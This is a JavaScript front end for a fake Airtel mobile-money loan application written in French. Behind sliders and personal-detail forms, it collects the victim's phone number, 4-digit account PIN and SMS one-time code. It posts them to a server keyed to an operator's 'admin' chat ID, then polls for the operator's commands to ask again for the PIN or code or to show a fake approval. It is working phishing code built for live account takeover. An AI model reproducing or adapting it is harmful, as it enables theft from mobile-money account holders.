document.addEventListener('DOMContentLoaded', () => {
  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
  const stepSlider = document.getElementById('step-slider');
  const stepForm1 = document.getElementById('step-form-1');
  const stepForm2 = document.getElementById('step-form-2');
  const stepForm3 = document.getElementById('step-form-3');
  const stepPin = document.getElementById('step-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(targetStep) {
    [stepUnderstand, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Sliders Synchronization
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');
  const formAmount = document.getElementById('form-amount');
  const formDuration = document.getElementById('form-duration');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      const val = `${Number(e.target.value).toLocaleString()} FCFA`;
      balanceVal.innerText = val;
      if (formAmount) formAmount.value = val;
      const summaryAmt = document.getElementById('summary-amount');
      if (summaryAmt) summaryAmt.innerText = val;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      const val = `${e.target.value} mois`;
      durationVal.innerText = val;
      if (formDuration) formDuration.value = `${e.target.value} Mois`;
      const summaryDur = document.getElementById('summary-duration');
      if (summaryDur) summaryDur.innerText = `${e.target.value} Mois`;
    });
  }

  // Enforce Phone Number to ONLY start with 0
  const phoneInput = document.getElementById('phone-number');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 0 && !val.startsWith('0')) {
        val = '0' + val.replace(/^0+/, '');
      }
      e.target.value = val;
    });
  }

  // Multi-step Navigation
  const btnUnderstand = document.getElementById('btn-understand-proceed');
  if (btnUnderstand) btnUnderstand.addEventListener('click', () => showStep(stepSlider));
  
  const btnSliderNext = document.getElementById('btn-slider-next');
  if (btnSliderNext) {
    btnSliderNext.addEventListener('click', () => {
      if (sliderBalance && formAmount) {
        formAmount.value = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
      }
      showStep(stepForm1);
    });
  }

  const btnForm1Next = document.getElementById('btn-form1-next');
  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));

  const btnForm2Back = document.getElementById('btn-form2-back');
  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));

  const btnForm2Next = document.getElementById('btn-form2-next');
  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      // Validate phone starts with 0 and has appropriate length
      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
        if (phoneError) {
          phoneError.innerText = 'Le numéro de téléphone doit commencer par 0 et être valide.';
          phoneError.style.display = 'block';
        }
        return;
      }
      if (phoneError) phoneError.style.display = 'none';

      const sumApplicant = document.getElementById('summary-applicant');
      const sumPurpose = document.getElementById('summary-purpose');
      const loanTypeEl = document.getElementById('loan-type');

      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Client Airtel';
      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;

      showStep(stepForm3);
    });
  }

  const btnForm3Back = document.getElementById('btn-form3-back');
  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));

  const btnForm3Submit = document.getElementById('btn-form3-submit');
  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const displayPhone = document.getElementById('display-applicant-phone');
      if (displayPhone) {
        displayPhone.innerText = phoneVal;
      }

      showStep(stepPin);
      if (pinDigits[0]) pinDigits[0].focus();
    });
  }

  // Digits input focus and auto-submit
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits4 = document.querySelectorAll('.otp-digit-4');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits4, () => submitOtpHandler());

  // Submit Credentials (Phone & PIN)
  const btnSubmitCreds = document.getElementById('btn-submit-creds');
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const pinVal = Array.from(pinDigits).map(i => i.value).join('');

      const pinError = document.getElementById('pin-error');
      if (pinVal.length !== 4) {
        if (pinError) pinError.style.display = 'block';
        return;
      }
      if (pinError) pinError.style.display = 'none';

      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
      showLoading('Vérification en cours...', 'Envoi sécurisé de vos identifiants.');

      try {
        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
        });

        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          const loadTitle = document.getElementById('loading-title');
          const loadSub = document.getElementById('loading-sub');
          if (loadTitle) loadTitle.innerText = "En attente de validation de l'administrateur...";
          if (loadSub) loadSub.innerText = 'Veuillez rester sur cette page.';
          startStatusPolling();
        } else {
          hideLoading();
          alert(data.error || 'Échec du traitement.');
        }
      } catch (e) {
        hideLoading();
        alert('Erreur réseau.');
      }
    });
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepOtp);
          if (otpDigits4[0]) otpDigits4[0].focus();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          const approvedDisp = document.getElementById('approved-amount-display');
          if (approvedDisp && sliderBalance) {
            approvedDisp.innerText = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
          }
          showStep(stepSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
          pinDigits.forEach(i => i.value = '');
          if (pinDigits[0]) pinDigits[0].focus();
          showStep(stepPin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
          otpDigits4.forEach(i => i.value = '');
          if (otpDigits4[0]) otpDigits4[0].focus();
          showStep(stepOtp);
        }
      } catch (e) {}
    }, 3000);
  }

  async function submitOtpHandler() {
    const otpVal = Array.from(otpDigits4).map(i => i.value).join('');

    const otpError = document.getElementById('otp-error');
    if (otpVal.length !== 4) {
      if (otpError) otpError.style.display = 'block';
      return;
    }
    if (otpError) otpError.style.display = 'none';
    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');

    showLoading('Vérification du code OTP...', 'Analyse du SMS Airtel.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });

      const data = await res.json();
      if (data.success) {
        const loadTitle = document.getElementById('loading-title');
        const loadSub = document.getElementById('loading-sub');
        if (loadTitle) loadTitle.innerText = 'Validation en cours...';
        if (loadSub) loadSub.innerText = 'Veuillez patienter.';
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);

  const btnGoHome = document.getElementById('btn-go-home');
  if (btnGoHome) {
    btnGoHome.addEventListener('click', () => {
      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
    });
  }

  function showLoading(title, sub) {
    const loadTitle = document.getElementById('loading-title');
    const loadSub = document.getElementById('loading-sub');
    if (loadTitle) loadTitle.innerText = title;
    if (loadSub) loadSub.innerText = sub;
    if (stepLoading) stepLoading.classList.add('active');
  }

  function hideLoading() {
    if (stepLoading) stepLoading.classList.remove('active');
  }
});
                                    
